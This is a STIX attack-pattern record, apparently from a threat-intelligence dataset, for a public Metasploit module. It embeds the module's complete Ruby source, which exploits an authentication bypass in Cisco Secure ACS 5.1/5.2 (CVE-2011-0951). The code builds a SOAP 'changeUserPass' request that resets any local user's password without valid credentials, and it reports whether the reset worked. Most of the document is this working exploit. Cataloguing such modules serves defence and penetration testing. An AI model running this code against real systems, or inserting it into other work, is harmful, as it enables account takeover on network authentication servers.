{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a1454b16-e254-4e53-9411-ef2fd9026499",
    "created": "2024-08-14T16:24:19.631161Z",
    "modified": "2024-08-14T16:24:19.631165Z",
    "name": "Cisco Secure ACS Unauthorized Password Change",
    "description": " This module exploits an authentication bypass issue which allows arbitrary password change requests to be issued for any user in the local store. Instances of Secure ACS running version 5.1 with patches 3, 4, or 5 as well as version 5.2 with either no patches or patches 1 and 2 are vulnerable.  'References' => [ ['BID', '47093']",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/networking/cisco_secure_acs_bypass.rb",
            "external_id": "cisco_secure_acs_bypass.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.cisco.com/en/US/products/csa/cisco-sa-20110330-acs.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n  include Msf::Exploit::Deprecated\n  moved_from 'auxiliary/admin/cisco/cisco_secure_acs_bypass'\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Cisco Secure ACS Unauthorized Password Change',\n        'Description' => %q{\n          This module exploits an authentication bypass issue which allows arbitrary\n          password change requests to be issued for any user in the local store.\n          Instances of Secure ACS running version 5.1 with patches 3, 4, or 5 as well\n          as version 5.2 with either no patches or patches 1 and 2 are vulnerable.\n        },\n        'References' =>\n          [\n            ['BID', '47093'],\n            ['CVE', '2011-0951'],\n            ['URL', 'http://www.cisco.com/en/US/products/csa/cisco-sa-20110330-acs.html']\n          ],\n        'Author' =>\n          [\n            'Jason Kratzer <pyoor[at]flinkd.org>'\n          ],\n        'License' => MSF_LICENSE\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptString.new('TARGETURI', [true, 'Path to UCP WebService', '/PI/services/UCP/']),\n        OptString.new('USERNAME', [true, 'Username to use', '']),\n        OptString.new('PASSWORD', [true, 'Password to use', '']),\n        OptBool.new('SSL', [true, 'Use SSL', true])\n      ]\n    )\n  end\n\n  def run_host(_ip)\n    soapenv = 'http://schemas.xmlsoap.org/soap/envelope/'\n    soapenvenc = 'http://schemas.xmlsoap.org/soap/encoding/'\n    xsi = 'http://www.w3.org/1999/XMLSchema-instance'\n    xsd = 'http://www.w3.org/1999/XMLSchema'\n    # ns1 = 'ns1:changeUserPass'\n\n    data = '<?xml version=\"1.0\" encoding=\"utf-8\"?>' + \"\\r\\n\"\n    data << '<SOAP-ENV:Envelope SOAP-ENV:encodingStyle=\"' + soapenvenc + '\" '\n    data << 'xmlns:SOAP-ENC=\"' + soapenvenc + '\" '\n    data << 'xmlns:xsi=\"' + xsi + '\" xmlns:SOAP-ENV=\"' + soapenv + '\" '\n    data << 'xmlns:xsd=\"' + xsd + '\">' + \"\\r\\n\"\n\n    data << '<SOAP-ENV:Body>' + \"\\r\\n\"\n    data << '<ns1:changeUserPass xmlns:ns1=\"UCP\" SOAP-ENC:root=\"1\">' + \"\\r\\n\"\n    data << '<v1 xsi:type=\"xsd:string\">' + datastore['USERNAME'] + '</v1>' + \"\\r\\n\"\n    data << '<v2 xsi:type=\"xsd:string\">fakepassword</v2>' + \"\\r\\n\"\n    data << '<v3 xsi:type=\"xsd:string\">' + datastore['PASSWORD'] + '</v3>' + \"\\r\\n\"\n    data << '</ns1:changeUserPass>'\n    data << '</SOAP-ENV:Body>' + \"\\r\\n\"\n    data << '</SOAP-ENV:Envelope>' + \"\\r\\n\\r\\n\"\n\n    print_status('Issuing password change request for: ' + datastore['USERNAME'])\n\n    begin\n      uri = normalize_uri(target_uri.path)\n      uri << '/' if uri[-1, 1] != '/'\n      res = send_request_cgi({\n        'uri' => uri,\n        'method' => 'POST',\n        'data' => data,\n        'headers' =>\n          {\n            'SOAPAction' => '\"changeUserPass\"'\n          }\n      }, 60)\n    rescue ::Rex::ConnectionError\n      print_error(\"#{rhost}:#{rport} [ACS] Unable to communicate\")\n      return :abort\n    end\n\n    if !res\n      print_error(\"#{rhost}:#{rport} [ACS] Unable to connect\")\n      return\n    elsif res.code == 200\n      body = res.body\n      if body.match(/success/i)\n        print_good(\"#{rhost} - Success! Password has been changed.\")\n      elsif body.match(/Password has already been used/)\n        print_error(\"#{rhost} - Failed! The supplied password has already been used.\")\n        print_error('Please change the password and try again.')\n      elsif body.match(/Invalid credntials for user/)\n        print_error(\"#{rhost} - Failed! Either the username does not exist or target is not vulnerable.\")\n        print_error('Please change the username and try again.')\n      else\n        print_error(\"#{rhost} - Failed!  An unknown error has occurred.\")\n      end\n    else\n      print_error(\"#{rhost} - Failed! The webserver issued a #{res.code} response.\")\n      print_error('Please validate the TARGETURI option and try again.')\n    end\n\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}